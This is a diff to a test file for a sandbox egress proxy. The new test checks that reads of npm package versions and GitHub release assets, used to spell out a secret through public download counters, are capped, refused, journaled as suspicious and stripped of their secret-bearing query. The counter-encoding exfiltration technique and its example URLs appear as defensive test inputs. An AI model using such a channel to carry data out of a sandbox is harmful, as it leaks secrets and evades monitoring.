@@ -1,4 +1,5 @@
 import { beforeAll, describe, expect, it } from 'vitest';
+import { READ_CAPS } from '../../src/network/reads.js';
 import { egressRunnable, useEgress } from './egress.js';
 import { cli, ensureImage } from './helpers.js';
 
@@ -80,8 +81,26 @@ describe.skipIf(!egressRunnable)(`isolation 6: abuse of an allowed domain (${cli
     expect(await box.journal()).toContainEqual(expect.objectContaining({ method: 'GET', host: 'github.com', path: `/someone-else/elsewhere/blob/main/${SECRET}`, ok: true }));
   });
 
-  // Not closed by ORC-213: reads of a listed host are not limited to what the run needs, so a read can still carry code
-  // out to a counter the attacker reads (an npm package's version downloads, a GitHub release asset's `download_count`,
-  // public through the API), and the journal drops the query (it can carry a token), so code put there leaves no trace.
-  it.todo('a read of a listed host carries no code out: reads limited to what the run needs (hole: counters an attacker reads, query not journaled)');
+  // ORC-370: a read can carry code out to a counter the attacker reads (an npm version's downloads, a release asset's
+  // `download_count`, public through the API) by which versions or assets it reads. The proxy counts them per run: past
+  // the cap, refused before the stand-in internet sees them, journaled as suspicious with the package and version or the
+  // asset, never the query. A version read again is no new symbol: it goes.
+  it('a sequence of versions or release assets spelling out code is cut at the cap, journaled as suspicious, its query left out', async () => {
+    const tarball = (i: number) => `https://registry.npmjs.org/left-pad/-/left-pad-1.0.${i}.tgz?bits=${SECRET}`;
+    const asset = (i: number) => `https://github.com/someone-else/elsewhere/releases/download/v${i}/bit.bin`;
+    for (let i = 0; i < READ_CAPS.versionsPerPackage; i++) expect(await box.probe('fetch', tarball(i)), `version ${i}`).toMatch(/^200 /);
+    expect(await box.probe('fetch', tarball(READ_CAPS.versionsPerPackage))).toMatch(/^403 /);
+    expect(await box.probe('fetch', tarball(0))).toMatch(/^200 /);
+    for (let i = 0; i < READ_CAPS.assetsPerRepo; i++) expect(await box.probe('fetch', asset(i)), `asset ${i}`).toMatch(/^200 /);
+    expect(await box.probe('fetch', asset(READ_CAPS.assetsPerRepo))).toMatch(/^403 /);
+
+    const past = `/left-pad/-/left-pad-1.0.${READ_CAPS.versionsPerPackage}.tgz`;
+    expect(egress.seen.filter((s) => s.url.startsWith(past) || s.url.includes(`/v${READ_CAPS.assetsPerRepo}/bit.bin`))).toEqual([]);
+    const journal = await box.journal();
+    expect(journal).toContainEqual(expect.objectContaining({ host: 'registry.npmjs.org', path: past, ok: false, suspicious: true, read: { kind: 'npm', name: 'left-pad', item: `1.0.${READ_CAPS.versionsPerPackage}` } }));
+    expect(journal).toContainEqual(expect.objectContaining({ host: 'github.com', ok: false, suspicious: true, read: { kind: 'release', name: 'someone-else/elsewhere', item: `v${READ_CAPS.assetsPerRepo}/bit.bin` } }));
+    expect(journal).toContainEqual(expect.objectContaining({ host: 'registry.npmjs.org', ok: true, read: { kind: 'npm', name: 'left-pad', item: '1.0.0' } }));
+    // The query never reaches the journal: the counters do not see it, and it can carry a token.
+    expect(JSON.stringify(journal)).not.toContain(`bits=${SECRET}`);
+  });
 });
